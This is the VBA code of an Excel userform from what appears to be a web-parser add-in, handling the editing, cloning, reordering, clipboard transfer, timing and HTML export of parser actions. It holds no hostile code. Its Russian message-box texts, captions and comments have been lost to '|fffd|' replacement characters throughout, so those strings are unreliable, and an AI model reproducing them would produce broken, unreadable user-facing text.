Public ClipboardActiveAction As ArrayAction, ClipboardAAs As ArrayActions
Public SpecialControlsCollection As Collection, StopEvents As Boolean, ColumnMode As Boolean, ShowLongResult As Boolean

Const FRAME_ACTIONS_HEIGHT_2_ROWS& = 76, FRAME_ACTIONS_HEIGHT_3_ROWS& = 112, FRAME_ACTIONS_HEIGHT_4_ROWS& = 148

Private Sub CheckBox_AA_Enabled_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    ActiveAction.Enabled = Me.CheckBox_AA_Enabled
    LoadActiveActionParameters
    Fill_AAs_Values
End Sub

Private Sub CheckBox_ShowArraysAsRows_Click()
    On Error Resume Next
    With TestResultField
        If Me.CheckBox_ShowArraysAsRows Then
            .value = Replace(.value, ARSEP, vbLf)
        End If
        .SetFocus
        .SelStart = 0
    End With
End Sub

Private Sub ComboBox_AA_Parameter1_Change(): ChangeParameter Me.ComboBox_AA_Parameter1: End Sub
Private Sub ComboBox_AA_Parameter2_Change(): ChangeParameter Me.ComboBox_AA_Parameter2: End Sub
Private Sub ComboBox_AA_Parameter3_Change(): ChangeParameter Me.ComboBox_AA_Parameter3: End Sub
Private Sub ComboBox_AA_Parameter4_Change(): ChangeParameter Me.ComboBox_AA_Parameter4: End Sub
Private Sub ComboBox_AA_Parameter5_Change(): ChangeParameter Me.ComboBox_AA_Parameter5: End Sub
Private Sub ComboBox_AA_Parameter6_Change(): ChangeParameter Me.ComboBox_AA_Parameter6: End Sub
Private Sub ComboBox_AA_Parameter7_Change(): ChangeParameter Me.ComboBox_AA_Parameter7: End Sub
Private Sub ComboBox_AA_Parameter8_Change(): ChangeParameter Me.ComboBox_AA_Parameter8: End Sub
    
Private Sub ComboBox_AA_Parameter1_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.ComboBox_AA_Parameter1
End Sub
Private Sub ComboBox_AA_Parameter2_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.ComboBox_AA_Parameter2
End Sub
Private Sub ComboBox_AA_Parameter3_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.ComboBox_AA_Parameter3
End Sub
Private Sub ComboBox_AA_Parameter4_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.ComboBox_AA_Parameter4
End Sub
Private Sub ComboBox_AA_Parameter5_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.ComboBox_AA_Parameter5
End Sub
Private Sub ComboBox_AA_Parameter6_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.ComboBox_AA_Parameter6
End Sub
Private Sub ComboBox_AA_Parameter7_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.ComboBox_AA_Parameter7
End Sub
Private Sub ComboBox_AA_Parameter8_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.ComboBox_AA_Parameter8
End Sub

Sub ShowVariablesList(ByRef combo As MSForms.ComboBox)
    On Error Resume Next
    If combo.Style = fmStyleDropDownList Then combo.DropDown: Exit Sub
    If Me.AAs.ParentParser Is Nothing Then Set Me.AAs.ParentParser = RunningParser
    Dim arr: arr = Me.AAs.ParentParser.GetVariablesNamesList(True, Me.AAs, Me.Caption)
    With Me.ComboBox_VariableList
        .Tag = ""
        .list = arr
        .ListIndex = -1
        .SetFocus
        .Left = combo.Left + 1
        .Top = combo.Top + combo.Height - .Height
        .Tag = combo.Name
        .DropDown
    End With
End Sub

Private Sub ComboBox_VariableList_Change()
    On Error Resume Next
    If Me.ComboBox_VariableList.Tag = "" Then Exit Sub
    Dim combo As MSForms.ComboBox, txt$
    Set combo = Me.Controls(Me.ComboBox_VariableList.Tag)
    If Me.ComboBox_VariableList.value = "help" Then
        FWF.FollowHyperlink "http://excelvba.ru/programmes/Parser/manuals/SpecialVariables"
    Else
        txt$ = Left(combo.text, combo.SelStart) & Me.ComboBox_VariableList.value & Mid(combo.text, combo.SelStart + combo.SelLength + 1)
        combo.text = txt$
    End If
End Sub

Sub ChangeParameter(ByRef combo As MSForms.ComboBox)
    On Error Resume Next: If StopEvents Then Exit Sub
    Dim ParamName$
    ParamName$ = combo.Tag
    ' MsgBox "From |fffd|" & ActiveAction.Parameters(ParamName$).Value & "|fffd| to |fffd|" & combo.Text & "|fffd|", , "ParamName$ = " & combo.Tag
    ActiveAction.parameters(ParamName$).value = combo.text
    Fill_AAs_Values
End Sub

Private Sub ComboBox_CloneOptions_Change()
    On Error Resume Next
    If Val(Me.ComboBox_CloneOptions) Then CloneActions Val(Me.ComboBox_CloneOptions), True: Me.ComboBox_CloneOptions.ListIndex = -1
End Sub

Private Sub ComboBox_SubMenu_Result_Change()
    On Error Resume Next: Dim txt$: txt = Trim(Me.ComboBox_SubMenu_Result)
    If Len(txt) Then SubMenuAction txt, Me.TextBox_TestDestination: Me.ComboBox_SubMenu_Result.ListIndex = -1
End Sub

Private Sub ComboBox_SubMenu_Result2_Change()
    On Error Resume Next: Dim txt$: txt = Trim(Me.ComboBox_SubMenu_Result2)
    If Len(txt) Then SubMenuAction txt, Me.TextBox_TestDestination2: Me.ComboBox_SubMenu_Result2.ListIndex = -1
End Sub

Private Sub ComboBox_SubMenu_Source_Change()
    On Error Resume Next: Dim txt$: txt = Trim(Me.ComboBox_SubMenu_Source)
    If Len(txt) Then SubMenuAction txt, Me.TextBox_TestSource: Me.ComboBox_SubMenu_Source.ListIndex = -1
End Sub

Private Sub CommandButton_ChangeCurrentAction_Click()
    On Error Resume Next: Dim ActionCodename$
    ActionCodename$ = SelectAction
    If ActionCodename$ = "" Then Exit Sub
    ActiveAction.ClearParameters
    Me.TextBox_ArrayActionCodeName = ActionCodename$
End Sub

Private Sub CommandButton_Clipboard_Clear_Click()
    Set Me.ClipboardAAs = New ArrayActions
    Fill_ClipboardAAs_Values
    Me.ListBox_ClipboardActions.SetFocus
End Sub

Private Sub CommandButton_Clipboard_MoveDownAction_Click()
    On Error Resume Next
    Set ClipboardActiveAction = ClipboardActiveAction.MoveDown
    Fill_ClipboardAAs_Values
    Me.ListBox_ClipboardActions.SetFocus
End Sub

Private Sub CommandButton_Clipboard_MoveUpAction_Click()
    On Error Resume Next
    Set ClipboardActiveAction = ClipboardActiveAction.MoveUp
    Fill_ClipboardAAs_Values
    Me.ListBox_ClipboardActions.SetFocus
End Sub


Sub CommandButton_Clipboard_RemoveAction_Click()
    On Error Resume Next
    Dim Index&: Index& = Me.ListBox_ClipboardActions.ListIndex
    ClipboardAAs.DeleteAction ClipboardActiveAction.Index
    Set ClipboardActiveAction = Nothing
    Fill_ClipboardAAs_Values
    Err.Clear: Me.ListBox_ClipboardActions.ListIndex = Index&
    If Err Then Me.ListBox_ClipboardActions.ListIndex = ClipboardAAs.Items.Count - 1
    
    Me.ListBox_ClipboardActions.SetFocus
    Set ClipboardActiveAction = ClipboardAAs.GetActionByIndex(Me.ListBox_ClipboardActions.ListIndex + 1)
End Sub

Private Sub CommandButton_CloneAction_Click()
    CloneActions
End Sub

Sub CloneActions(Optional ByVal Amount& = 1, Optional ByVal ToTheEnd As Boolean = False)
    On Error Resume Next
    Dim Index&, SourceAA As ArrayAction, i&
    Index& = Me.ListBox_ArrayActions.ListIndex + 1
    If Index& = 0 Then Exit Sub
    If Index& + Amount& - 1 > Me.AAs.Items.Count Then MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd|": Exit Sub
    
    For i = Index& To Index& + Amount& - 1
        Set SourceAA = Nothing: Set SourceAA = Me.AAs.GetActionByIndex(i)
        If Not SourceAA Is Nothing Then AAs.AddFromObject SourceAA, IIf(ToTheEnd, 0, Index&)
    Next
    
    Fill_AAs_Values
    Me.ListBox_ArrayActions.ListIndex = Index& + Amount& - 1
    LoadActiveActionParameters
    
    '    Dim Index&, SourceAA As ArrayAction
    '    Index& = Me.ListBox_ArrayActions.ListIndex + 1
    '    Set SourceAA = Me.ActiveAction
    '
    '    If Index& = 0 Then Exit Sub
    '    If SourceAA Is Nothing Then Exit Sub
    '
    '    With AAs.AddNewAction(SourceAA.Codename, IIf(ToTheEnd, 0, Index&))
    '        .LoadFromXML SourceAA.ExportToXML
    '        Set .Parent = SourceAA.Parent
    '    End With
    '    Fill_AAs_Values
    '    Me.ListBox_ArrayActions.ListIndex = Index&
    '    LoadActiveActionParameters
End Sub

Private Sub CommandButton_CloneAction_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    On Error Resume Next: If Button = 2 Then Me.ComboBox_CloneOptions.DropDown
End Sub

Sub CommandButton_CreateAction_Click()
    On Error Resume Next
    Dim ind&, ActionCodename$
    ActionCodename$ = SelectAction
    If ActionCodename$ = "" Then Exit Sub
    
    ind& = AAs.AddNewAction(ActionCodename$, Me.ListBox_ArrayActions.ListIndex + 1).Index
    Fill_AAs_Values
    Me.ListBox_ArrayActions.ListIndex = ind& - 1
    Me.Frame_EditFunction.Visible = True
    With Me.ComboBox_AA_Parameter1
        .SetFocus
        .SelStart = 0
        .SelLength = 1000
    End With
End Sub

Private Sub CommandButton_CreateDuplicatesForActiveAction_Click()
    On Error Resume Next
    If Me.ActiveAction Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Sub
    Dim txt$, arr, Sarr, i&
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        txt$ = .GetText
    End With
    If Not txt Like "*:*" Then
        MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
        Exit Sub
    End If
    arr = Split(txt, vbNewLine)
    For i = LBound(arr) To UBound(arr)
        Sarr = "": Sarr = Split(StrReverse(Replace(arr(i), "://", ARSEP)), ":", 2)
        If UBound(Sarr) = 1 Then
            With Me.ActiveAction
                With .Parent.AddFromObject(Me.ActiveAction, Me.ActiveAction.Index + i)
                    .parameters(1).value = Replace(StrReverse(Sarr(1)), ARSEP, "://")
                    .parameters(2).value = Trim(Replace(StrReverse(Sarr(0)), ARSEP, "://"))
                End With
                '    With .Parent.AddNewAction(.Codename, .Index + i)
                '        .LoadParameters
                '        .Parameters(1).Value = Replace(StrReverse(sarr(1)), ARSEP, "://")
                '        .Parameters(2).Value = Replace(StrReverse(sarr(0)), ARSEP, "://")
                '    End With
            End With
        End If
    Next i
    Me.AAs.DeleteAction ActiveAction.Index
    Set ActiveAction = Nothing
    Set ActiveAction = AAs.GetActionByIndex(AAs.Items.Count)
    'Fill_AAs_Values
    'Me.ListBox_ArrayActions.ListIndex = AAs.Items.Count - 1
    Fill_AAs_Values
    LoadActiveActionParameters
End Sub

Sub CommandButton_DeleteAllActions_Click()
    On Error Resume Next
    While Me.AAs.Items.Count > 0
        Me.AAs.Items.Remove 1
    Wend
    Fill_AAs_Values
End Sub

Private Sub CommandButton_ExportToHTML_Click()
    On Error Resume Next
    Dim txt$: txt = RenderConstants(Me.TextBox_TestSource)
    Me.AAs.ExportToHTML txt$, Me.CheckBox_Export_AddResultColumn, Me.CheckBox_Export_AddSourceValue, Me.CheckBox_Export_SmallFields, ActiveAction.Index
End Sub

Private Sub CommandButton_GetDuration_Click()
    On Error Resume Next
    TEST_ACTIONS_MODE = False
    Dim IterationsCount&, ProcessTime$, t As Double
    IterationsCount& = 1: t = GetActionAverageTime(IterationsCount&)
    If t > 3 Then GoTo StopTimeTest
    IterationsCount& = 5: t = GetActionAverageTime(IterationsCount&)
    If t > 0.5 Then GoTo StopTimeTest
    IterationsCount& = 10: t = GetActionAverageTime(IterationsCount&)
    If t > 0.2 Then GoTo StopTimeTest
    IterationsCount& = 30: t = GetActionAverageTime(IterationsCount&)
    If t > 0.1 Then GoTo StopTimeTest
    IterationsCount& = 100: t = GetActionAverageTime(IterationsCount&)
    
StopTimeTest:
    ProcessTime$ = IIf(t < 1, Format(t * 1000, "0.00") & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Format(t, "0.00") & " |fffd||fffd||fffd|.")
    ProcessTime$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & ProcessTime$ & vbNewLine & _
        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & IterationsCount& & _
        IIf(t >= 0.5, "", vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:   " & IIf(t = 0, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|", Format(1 / t, "0.00")))
    MsgBox ProcessTime$, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ActiveAction.Codename & "|fffd|"
End Sub

Function GetActionAverageTime(ByVal IterationsCount&) As Double
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim TimeStamp As Double, txt$, i&, ByrefValue$
    If IterationsCount& <= 0 Then Exit Function
    txt = RenderConstants(Me.TextBox_TestSource)
    TimeStamp = Timer
    For i = 1 To IterationsCount&
        ByrefValue$ = txt        '& String(i, "a")
        ActiveAction.ApplyTo ByrefValue$
    Next i
    GetActionAverageTime = (Timer - TimeStamp) / IterationsCount&
End Function

Private Sub CommandButton_JumpToNextLevel_Click()
    On Error Resume Next
    If Me.ColumnMode Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        JumpToNextLevel = True
        Me.Save
        Unload Me
        
    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim NewLevel&, SourceValue$, msg$
        If Not Saved Then
            msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
            Select Case MsgBox(msg, vbQuestion + vbYesNoCancel + vbDefaultButton3, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
                Case vbYes
                    Me.Save
                Case vbNo
                    ' close unsaved
                Case vbCancel
                    Exit Sub
            End Select
        End If
        
        SourceValue$ = TestResultField
        With RunningParser.SourceData.Actions.GetActiveActions
            ' If .GetLevel >= .GetMaxLevel Then MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & .GetLevel & " |fffd||fffd| " & .GetMaxLevel & ")": Exit Sub
            JumpToNextLevel = True
            NextLevelSourceValue = "": NextLevelSourceValue = Split(SourceValue$, ARSEP)(0)
            Unload Me
        End With
    End If
End Sub

Private Sub CommandButton_MoveDownAction_Click()
    On Error Resume Next
    Set ActiveAction = ActiveAction.MoveDown
    Fill_AAs_Values
    If ActiveAction.Index - Me.ListBox_ArrayActions.TopIndex > 7 Then Me.ListBox_ArrayActions.TopIndex = Me.ListBox_ArrayActions.TopIndex + 1
    Me.ListBox_ArrayActions.SetFocus
End Sub

Private Sub CommandButton_MoveUpAction_Click()
    On Error Resume Next
    Set ActiveAction = ActiveAction.MoveUp
    Fill_AAs_Values
    If Me.ListBox_ArrayActions.TopIndex - ActiveAction.Index > -4 Then Me.ListBox_ArrayActions.TopIndex = Me.ListBox_ArrayActions.TopIndex - 1
    Me.ListBox_ArrayActions.SetFocus
End Sub

Sub CommandButton_RemoveAction_Click()
    On Error Resume Next
    Dim Index&: Index& = Me.ListBox_ArrayActions.ListIndex
    AAs.DeleteAction ActiveAction.Index
    Set ActiveAction = Nothing
    Fill_AAs_Values
    Err.Clear: Me.ListBox_ArrayActions.ListIndex = Index&
    If Err Then Me.ListBox_ArrayActions.ListIndex = AAs.Items.Count - 1
    Fill_AAs_Values
    
    Me.ListBox_ArrayActions.SetFocus
    Set ActiveAction = AAs.GetActionByIndex(Me.ListBox_ArrayActions.ListIndex + 1)
    Me.Frame_EditFunction.Visible = Me.ListBox_ArrayActions.ListIndex >= 0
    LoadActiveActionParameters
End Sub

Private Sub CommandButton_RemoveAction_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    On Error Resume Next: Dim msg$
    If Button = 2 Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        If MsgBox(msg$, vbQuestion + vbOKCancel + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") <> vbOK Then Exit Sub
        CommandButton_DeleteAllActions_Click
    End If
End Sub

Private Sub CommandButton_SaveIntoAddinStorage_Click()
    Me.SaveIntoAddinStorage
End Sub

Private Sub CommandButton_ShowActionDescription_MouseDown(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    Me.Frame_Test.Visible = False
    Me.TextBox_ActionDescription.Visible = True
End Sub

Private Sub CommandButton_ShowActionDescription_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    Me.Frame_Test.Visible = True
    Me.TextBox_ActionDescription.Visible = False
End Sub

Private Sub CommandButton_Stop_Click()
    StopMacro = True
End Sub

Private Sub CommandButton_TestActions_Click()
    On Error Resume Next
    StopMacro = False: Set GlobalError = Err
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    Set RowVariables = New Dictionary
    Dim X: Set X = ParserVariables
    TEST_ACTIONS_MODE = True
    
    Dim RO As Range, cell As Range, tmpSI As ParserSourceItem, ColName$: Set RO = ActiveCell.EntireRow
    If Not RO Is Nothing Then
        ParserVariables.item("{filename}") = Split(RO.Worksheet.Parent.Name, ".xls")(0)
        ParserVariables.item("{sheetname}") = RO.Worksheet.Name
        
        Set RowVariables = New Dictionary: Set tmpSI = New ParserSourceItem
        tmpSI.SetDestinationRow RO
        FillRowVariables RO, tmpSI, True
        Set tmpSI = Nothing
        
        RowVariables.item("{column}") = RowVariables.item("{" & ActiveCell.Column & "}")
        RowVariables.item("{column@}") = RowVariables.item("{" & ActiveCell.Column & "@}")
        RowVariables.item("{ColumnLetter}") = Split(ActiveCell.EntireColumn.Address(0, 0), ":")(0)
    End If
    
    If Me.Caption Like "* |fffd||fffd||fffd||fffd||fffd||fffd||fffd| *|fffd|*|fffd|*" Then
        ColName$ = Split(Split(Me.Caption, "|fffd|")(UBound(Split(Me.Caption, "|fffd|"))), "|fffd|")(0)
        RowVariables.item("{ColumnName}") = ColName$
    End If
    With RunningParser
        .ReadOptionsFromINI
        .Variables.Initialize
        ParserVariables.item("{ParserName}") = .Name
        
        If .Downloads.Enabled Then .Downloads.SaveFoldersInVariables
        
        '        Set .PrInd1 = New ProgressIndicatorNew: .PrInd1.StatusBar = True
        '        .PrInd1.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        
        Me.CommandButton_stop.Visible = True: Me.CommandButton_TestActions.Enabled = False
        Me.TestActions
        Me.CommandButton_stop.Visible = False: Me.CommandButton_TestActions.Enabled = True
        
        '        .PrInd1.Hide
    End With
    TEST_ACTIONS_MODE = False
    
    Application.ScreenUpdating = True
End Sub

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Private Sub CommandButton_ToClipboard_CopyAll_Click()
    On Error Resume Next
    Dim aa As ArrayAction
    For Each aa In Me.AAs.Items
        Me.ClipboardAAs.AddFromObject aa
    Next
    Me.Fill_ClipboardAAs_Values
End Sub
Private Sub CommandButton_ToClipboard_CopySelected_Click()
    On Error Resume Next
    Me.ClipboardAAs.AddFromObject Me.ActiveAction
    Me.Fill_ClipboardAAs_Values
    Me.ListBox_ArrayActions.ListIndex = Me.ListBox_ArrayActions.ListIndex + 1
End Sub
Private Sub CommandButton_ToClipboard_MoveAll_Click()
    On Error Resume Next
    Dim aa As ArrayAction
    For Each aa In Me.AAs.Items
        Me.ClipboardAAs.AddFromObject aa
    Next
    Set Me.AAs.Items = New Collection
    Me.Fill_AAs_Values
    Me.Fill_ClipboardAAs_Values
    Me.ListBox_ClipboardActions.SetFocus
End Sub
Private Sub CommandButton_ToClipboard_MoveSelected_Click()
    On Error Resume Next
    Me.ClipboardAAs.AddFromObject Me.ActiveAction
    Me.Fill_ClipboardAAs_Values
    Me.CommandButton_RemoveAction_Click
End Sub

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Private Sub CommandButton_FromClipboard_CopyAll_Click()
    On Error Resume Next
    Dim aa As ArrayAction, ind&
    ind& = Me.ListBox_ArrayActions.ListIndex + 1
    For Each aa In Me.ClipboardAAs.Items
        Me.AAs.AddFromObject aa, ind&
        ind& = ind& + 1
    Next
    Me.Fill_AAs_Values
    Me.ListBox_ArrayActions.ListIndex = ind&
End Sub
Private Sub CommandButton_FromClipboard_CopySelected_Click()
    On Error Resume Next
    Dim ind&: ind& = Me.ListBox_ArrayActions.ListIndex + 1
    Me.AAs.AddFromObject Me.ClipboardActiveAction, ind&
    Me.Fill_AAs_Values
    Me.ListBox_ArrayActions.ListIndex = ind&
    Me.ListBox_ClipboardActions.ListIndex = Me.ListBox_ClipboardActions.ListIndex + 1
End Sub
Private Sub CommandButton_FromClipboard_MoveAll_Click()
    On Error Resume Next
    Dim aa As ArrayAction, ind&
    ind& = Me.ListBox_ArrayActions.ListIndex + 1
    For Each aa In Me.ClipboardAAs.Items
        Me.AAs.AddFromObject aa, ind&
        ind& = ind& + 1
    Next
    Set Me.ClipboardAAs.Items = New Collection
    Me.Fill_AAs_Values
    Me.ListBox_ArrayActions.ListIndex = ind&
    
    Me.Fill_ClipboardAAs_Values
    Me.ListBox_ArrayActions.SetFocus
End Sub
Private Sub CommandButton_FromClipboard_MoveSelected_Click()
    On Error Resume Next
    Dim ind&: ind& = Me.ListBox_ArrayActions.ListIndex + 1
    Me.AAs.AddFromObject Me.ClipboardActiveAction, ind&
    Me.Fill_AAs_Values
    Me.ListBox_ArrayActions.ListIndex = ind&
    Me.CommandButton_Clipboard_RemoveAction_Click
End Sub



Private Sub Label_Clipboard_Get_Click()
    On Error Resume Next: Dim ValueIndex&
    ValueIndex& = Val(Me.Label_ClipboardIndex.Tag)
    If ValueIndex& Then Me.TextBox_TestSource = GetAddinClipboardValue(ValueIndex&)
End Sub

Private Sub Label_Clipboard_Get1_Click()
    On Error Resume Next: Dim ValueIndex&
    ValueIndex& = Val(Me.Label_ClipboardIndex.Tag)
    If ValueIndex& Then Me.TextBox_TestSource = Split(GetAddinClipboardValue(ValueIndex&), ARSEP)(0)
End Sub

Private Sub Label_Clipboard_GetNext_Click()
    On Error Resume Next: Dim ValueIndex&, currIndex&, maxIndex&
    ValueIndex& = Val(GetSetting(PROJECT_NAME$, "Clipboard", "CurrentIndex", 0))        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    currIndex& = Val(Me.Label_Clipboard_GetNext.Tag)
    maxIndex& = Val(Me.Label_Clipboard_Get.Tag)
    If (ValueIndex& = 0) Then Me.Label_Clipboard_Get1.Visible = False: Me.Label_Clipboard_GetNext.Visible = False: Exit Sub
    
    Me.TextBox_TestSource = Split(GetAddinClipboardValue(ValueIndex&), ARSEP)(currIndex& - 1)
    currIndex& = currIndex& + 1: If currIndex& > maxIndex& Then currIndex& = 1
    Me.Label_Clipboard_GetNext.Tag = currIndex&
    Me.Label_Clipboard_GetNext.Caption = "Next (" & currIndex& & ")"
End Sub

Private Sub Label_Clipboard_Save_Click(): Clipboard_Save False: End Sub
Private Sub Label_Clipboard_Save1_Click(): Clipboard_Save True: End Sub
    
Function Clipboard_Save(ByVal FirstOnly As Boolean) As Boolean
    On Error Resume Next: Dim FreeIndex&, arr
    If Trim(Me.TestResultField.text) = "" Then Exit Function
    
    FreeIndex& = GetFreeIndex_AddinClipboard
    With Me.Label_ClipboardIndex
        .Visible = True: .Tag = FreeIndex&: .Caption = ChrW(9311 + FreeIndex&)
        SaveSetting PROJECT_NAME$, "Clipboard", "CurrentIndex", FreeIndex&
    End With
    arr = Split(Me.TestResultField.text, ARSEP)
    SaveAddinClipboardValue FreeIndex&, IIf(FirstOnly, arr(0), Me.TestResultField.text)
    
    Me.Label_Clipboard_Get.Visible = True
    Me.Label_Clipboard_Get1.Visible = (UBound(arr) > 0) And Not FirstOnly
    Me.Label_Clipboard_GetNext.Visible = (UBound(arr) > 0) And Not FirstOnly
    
    Me.Label_Clipboard_Get.Tag = UBound(arr) + 1
    Me.Label_Clipboard_GetNext.Tag = 2
    Me.Label_Clipboard_GetNext.Caption = IIf(FirstOnly, "", "Next (" & 2 & ")")
    
    Me.Label_Clipboard_Save.Enabled = FirstOnly
    Me.Label_Clipboard_Save1.Enabled = Not FirstOnly
    Erase arr
    Fill_SubMenu_Comboes
End Function

Private Sub Label_ClipboardIndex_Click()
    On Error Resume Next: SubMenuAction "Clear Clipboard"
End Sub

Private Sub Label_CopyIntoClipboard_Click()
    On Error Resume Next
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .SetText Me.TextBox_TestDestination.text
        .PutInClipboard
    End With
End Sub
Private Sub Label_CopyIntoClipboard2_Click()
    On Error Resume Next
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .SetText Me.TextBox_TestDestination2.text
        .PutInClipboard
    End With
End Sub

